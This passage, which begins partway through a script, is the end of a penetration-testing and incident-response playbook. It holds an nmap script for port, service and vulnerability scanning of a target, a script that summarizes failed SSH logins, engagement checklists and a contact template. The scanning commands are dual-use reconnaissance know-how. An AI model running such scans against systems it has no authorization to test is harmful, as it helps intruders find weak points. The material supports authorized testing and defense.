nmap -sS -T4 -p $PORTS $TARGET -oN quick_scan.txt

# Service detection
echo "[*] Running service detection..."
nmap -sV -sC -p $PORTS $TARGET -oN service_scan.txt

# Vulnerability scan
echo "[*] Running vulnerability scan..."
nmap --script vuln -p $PORTS $TARGET -oN vuln_scan.txt

echo "[+] Scans complete!"
echo "[+] Results saved to:"
echo "    - quick_scan.txt"
echo "    - service_scan.txt"
echo "    - vuln_scan.txt"
```

## Log Analysis Script
```bash
#!/bin/bash
# Failed SSH login analysis

LOG_FILE="/var/log/auth.log"

echo "[*] Analyzing failed SSH logins..."

echo "[*] Top 10 attacking IPs:"
grep "Failed password" $LOG_FILE | awk '{print $11}' | sort | uniq -c | sort -nr | head -10

echo ""
echo "[*] Top 10 targeted usernames:"
grep "Failed password" $LOG_FILE | awk '{print $9}' | sort | uniq -c | sort -nr | head -10

echo ""
echo "[*] Failed login timeline (last 24 hours):"
grep "Failed password" $LOG_FILE | tail -100
```

---

# Checklist Templates

## Pre-Engagement Checklist
```
□ Scope of work defined
□ Authorization letter signed
□ Rules of engagement documented
□ Testing windows agreed
□ Emergency contacts obtained
□ Insurance verified
□ Legal review completed
□ Non-disclosure agreement signed
□ Statement of work finalized
□ Kickoff meeting scheduled
```

## Post-Test Checklist
```
□ All access removed
□ Testing tools removed from systems
□ Evidence securely stored
□ Logs reviewed
□ Report drafted
□ Findings validated
□ Report reviewed by second tester
□ Client debrief scheduled
□ Remediation timeline discussed
□ Follow-up retest scheduled (if needed)
```

---

# Emergency Response Contacts

## Incident Response Team Template
```
Primary Contact:
Name: _______________
Phone: ______________
Email: ______________

Secondary Contact:
Name: _______________
Phone: ______________
Email: ______________

Legal Counsel:
Name: _______________
Phone: ______________
Email: ______________

Management:
Name: _______________
Phone: ______________
Email: ______________

External Resources:
Forensics Firm: _______________
Incident Response Firm: _______________
Law Enforcement Contact: _______________
```

---

*These playbooks should be customized for your specific environment and regularly updated based on lessons learned and evolving threats.*
